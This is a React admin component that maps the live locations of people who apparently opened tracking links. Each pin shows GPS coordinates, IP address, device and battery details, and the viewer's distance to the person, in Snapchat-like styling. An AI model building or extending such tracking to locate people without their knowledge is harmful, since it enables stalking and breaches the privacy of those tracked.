// components/admin/LiveMap.tsx
"use client";

import React, { useEffect, useRef, useState } from "react";
import { LiveLocationItem } from "@/hooks/useRealtimeLocations";
import {
  getDarkTileLayerConfig, createSnapGhostIcon, createSnapAccuracyCircle,
  createAdminLocationIcon, createAdminAccuracyCircle, calculateDistanceMeters,
  formatDistance, fetchAdminCoordinates,
} from "@/lib/map-utils";
import { Compass, Navigation, ExternalLink, MapPin } from "lucide-react";
import { useTheme } from "@/hooks/useTheme";

interface LiveMapProps {
  locations: LiveLocationItem[];
}

export const LiveMap: React.FC<LiveMapProps> = ({ locations }) => {
  const mapContainerRef = useRef<HTMLDivElement>(null), mapInstanceRef = useRef<any>(null);
  const layerGroupRef = useRef<any>(null), tileLayerRef = useRef<any>(null);
  const [adminLoc, setAdminLoc] = useState<{ lat: number; lng: number; acc?: number } | null>(null);
  const [selectedIdx, setSelectedIdx] = useState(0);
  const { theme } = useTheme();

  const valid = locations.filter((l) => Math.abs(l.latitude) > 0.001 && Math.abs(l.longitude) > 0.001);
  const selectedLoc = valid[selectedIdx] || valid[0] || null;

  useEffect(() => { fetchAdminCoordinates((coords) => setAdminLoc(coords)); }, []);

  useEffect(() => {
    let isMounted = true;
    async function initMap() {
      if (!mapContainerRef.current || mapInstanceRef.current) return;
      const L = (await import("leaflet")).default;
      if (!isMounted || !mapContainerRef.current) return;

      const center: [number, number] = valid.length > 0 ? [valid[0].latitude, valid[0].longitude] : [31.5204, 74.3587];
      const map = L.map(mapContainerRef.current, { zoomControl: false, attributionControl: false }).setView(center, valid.length > 0 ? 14 : 6);
      L.control.zoom({ position: "bottomright" }).addTo(map);

      const tileConfig = getDarkTileLayerConfig(theme);
      tileLayerRef.current = L.tileLayer(tileConfig.url, tileConfig.options).addTo(map);
      layerGroupRef.current = L.layerGroup().addTo(map);
      mapInstanceRef.current = map;
      setTimeout(() => map.invalidateSize(), 250);
    }
    initMap();
    return () => {
      isMounted = false;
      if (mapInstanceRef.current) { mapInstanceRef.current.remove(); mapInstanceRef.current = null; }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => { if (tileLayerRef.current) tileLayerRef.current.setUrl(getDarkTileLayerConfig(theme).url); }, [theme]);

  useEffect(() => {
    async function updateMarkers() {
      if (!mapInstanceRef.current || !layerGroupRef.current) return;
      const L = (await import("leaflet")).default;
      layerGroupRef.current.clearLayers();

      const bounds: [number, number][] = [];
      const active = valid[selectedIdx] || valid[0] || null;

      if (adminLoc) {
        bounds.push([adminLoc.lat, adminLoc.lng]);
        const aMarker = L.marker([adminLoc.lat, adminLoc.lng], { icon: createAdminLocationIcon(L, 28) }).addTo(layerGroupRef.current);
        if (adminLoc.acc) createAdminAccuracyCircle(L, [adminLoc.lat, adminLoc.lng], adminLoc.acc).addTo(layerGroupRef.current);
        const dToActive = active ? formatDistance(calculateDistanceMeters(adminLoc.lat, adminLoc.lng, active.latitude, active.longitude), active.accuracy, adminLoc.acc) : null;
        aMarker.bindPopup(`<div style="color:#000;font-size:12px;padding:4px;"><b>📍 Your Location (Admin)</b><br/><span style="color:#555;">GPS Acc: ±${Math.round(adminLoc.acc || 0)}m</span>${dToActive ? `<br/><b>Distance: ${dToActive}</b>` : ""}</div>`);

        if (active) {
          L.polyline([[adminLoc.lat, adminLoc.lng], [active.latitude, active.longitude]], { color: "#1a73e8", weight: 2.5, opacity: 0.85, dashArray: "6, 6" }).addTo(layerGroupRef.current);
        }
      }

      valid.forEach((loc, idx) => {
        const pos: [number, number] = [loc.latitude, loc.longitude];
        bounds.push(pos);
        const marker = L.marker(pos, { icon: createSnapGhostIcon(L, 38) }).addTo(layerGroupRef.current);
        if (loc.accuracy && loc.accuracy > 0) createSnapAccuracyCircle(L, pos, loc.accuracy).addTo(layerGroupRef.current);

        const distStr = adminLoc ? formatDistance(calculateDistanceMeters(adminLoc.lat, adminLoc.lng, loc.latitude, loc.longitude), loc.accuracy, adminLoc.acc) : null;
        const gmapsUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
        const devStr = [loc.deviceInfo?.os, loc.deviceInfo?.browser, loc.deviceInfo?.battery !== undefined ? `${loc.deviceInfo.battery}%` : null].filter(Boolean).join(" • ");

        marker.on("click", () => { setSelectedIdx(idx); });

        marker.bindPopup(`
          <div style="color:#000;font-family:sans-serif;padding:4px;min-width:180px;">
            <strong style="font-size:13px;display:block;">${loc.linkTitle || `Visitor #${idx + 1}`}</strong>
            ${loc.ipAddress ? `<span style="font-size:11px;color:#333;display:block;">IP: <b>${loc.ipAddress}</b></span>` : ""}
            ${devStr ? `<span style="font-size:11px;color:#555;display:block;">${devStr}</span>` : ""}
            <span style="font-size:11px;color:#555;display:block;">${loc.latitude.toFixed(4)}, ${loc.longitude.toFixed(4)} &bull; Acc: ±${Math.round(loc.accuracy || 0)}m</span>
            ${distStr ? `<div style="margin:4px 0;font-size:11px;color:#1a73e8;font-weight:bold;">📏 Distance to Us: ${distStr}</div>` : ""}
            <div style="display:flex;gap:6px;margin-top:4px;">
              <a href="${gmapsUrl}" target="_blank" rel="noopener noreferrer" style="display:inline-block;font-size:11px;background:#000;color:#FFFC00;padding:4px 8px;border-radius:6px;text-decoration:none;font-weight:bold;">Google Maps &rarr;</a>
              ${loc.linkId ? `<a href="/admin/links/${loc.linkId}" style="display:inline-block;font-size:11px;background:#eee;color:#000;padding:4px 8px;border-radius:6px;text-decoration:none;font-weight:bold;">Track Link</a>` : ""}
            </div>
          </div>
        `);
      });

      if (bounds.length === 1) mapInstanceRef.current.setView(bounds[0], 14);
      else if (bounds.length > 1) mapInstanceRef.current.fitBounds(bounds, { padding: [40, 40], maxZoom: 15 });
    }
    updateMarkers();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [valid, adminLoc, selectedIdx]);

  const fitAdminAndPin = (pin: LiveLocationItem) => {
    if (!mapInstanceRef.current || !adminLoc) return;
    mapInstanceRef.current.fitBounds([[adminLoc.lat, adminLoc.lng], [pin.latitude, pin.longitude]], { padding: [50, 50] });
  };

  const currentDist = adminLoc && selectedLoc
    ? formatDistance(calculateDistanceMeters(adminLoc.lat, adminLoc.lng, selectedLoc.latitude, selectedLoc.longitude), selectedLoc.accuracy, adminLoc.acc)
    : null;

  return (
    <div className="relative w-full h-[470px] rounded-3xl overflow-hidden border border-white/10 shadow-2xl bg-[#0B0B0E]">
      <div ref={mapContainerRef} className="w-full h-full z-0 bg-[#0B0B0E]" />

      {/* Standard Top Overlay Bar */}
      <div className="absolute top-2 left-2 z-10 flex items-center gap-1.5 pointer-events-none">
        <div className="pointer-events-auto flex items-center gap-1.5 py-1 px-2.5 rounded-xl bg-[#0B0B0E]/90 backdrop-blur-xl border border-white/10 shadow-md">
          <span className="w-1.5 h-1.5 rounded-full shrink-0 bg-[#FFFC00] animate-pulse" />
          <span className="text-[10px] font-bold text-white whitespace-nowrap">
            {valid.length} {valid.length === 1 ? "Pin" : "Pins"}
          </span>
        </div>
        {selectedLoc && valid.length > 1 && (
          <div className="pointer-events-auto py-1 px-2.5 rounded-xl bg-[#0B0B0E]/90 backdrop-blur-xl border border-blue-500/30 shadow-md text-[10px] font-bold text-blue-300">
            {selectedLoc.linkTitle || `Pin #${selectedIdx + 1}`}
          </div>
        )}
      </div>

      {/* Sleek Compact Bottom Coordinate Card — Identical to Kid Map */}
      {selectedLoc ? (
        <div className="absolute bottom-2 left-2 right-2 sm:right-auto sm:max-w-xs z-10 bg-[#0B0B0E]/95 backdrop-blur-xl border border-white/10 rounded-xl p-2 sm:p-2.5 shadow-2xl">
          <div className="flex items-center justify-between gap-2 mb-1.5">
            <div className="flex items-center gap-1.5 min-w-0">
              <span className="text-[10px] sm:text-[11px] font-mono font-bold text-[#FFFC00] truncate">
                {selectedLoc.latitude.toFixed(4)}, {selectedLoc.longitude.toFixed(4)}
              </span>
              <span className="text-[9px] text-white/40 font-mono shrink-0">
                {selectedLoc.accuracy ? `±${Math.round(selectedLoc.accuracy)}m` : "GPS"}
              </span>
            </div>
            <a
              href={`https://www.google.com/maps?q=${selectedLoc.latitude},${selectedLoc.longitude}`}
              target="_blank" rel="noopener noreferrer"
              className="flex items-center gap-1 py-0.5 px-2 rounded-lg bg-white/10 hover:bg-white/20 text-white font-bold text-[10px] shrink-0 transition-all active:scale-95"
              title="Open Google Maps"
            >
              <Navigation className="w-2.5 h-2.5 text-[#FFFC00]" />
              <span>Maps</span>
              <ExternalLink className="w-2.5 h-2.5 text-white/40" />
            </a>
          </div>
          {currentDist && (
            <button
              onClick={() => fitAdminAndPin(selectedLoc)}
              title="Click to frame map between you and selected location"
              className="w-full flex items-center justify-between gap-1.5 py-1 px-2 rounded-lg bg-blue-500/15 hover:bg-blue-500/25 border border-blue-500/25 text-blue-300 text-[9px] sm:text-[10px] font-medium leading-none transition-all active:scale-[0.99]"
            >
              <span className="flex items-center gap-1 truncate">
                <Compass className="w-3 h-3 text-blue-400 shrink-0" />
                <span className="truncate">Distance to Us: {currentDist}</span>
              </span>
              <span className="text-[8px] text-blue-400/70 uppercase tracking-wider shrink-0 font-bold">Fit</span>
            </button>
          )}
        </div>
      ) : (
        <div className="absolute inset-0 z-10 flex flex-col items-center justify-center bg-[#0B0B0E]/80 backdrop-blur-sm text-center p-6">
          <MapPin className="w-10 h-10 text-white/30 mb-2" />
          <h4 className="text-sm font-bold text-white">No Live Locations Yet</h4>
          <p className="text-xs text-white/50 mt-1 max-w-xs">Incoming visitor coordinates will automatically plot on this map.</p>
        </div>
      )}
    </div>
  );
};
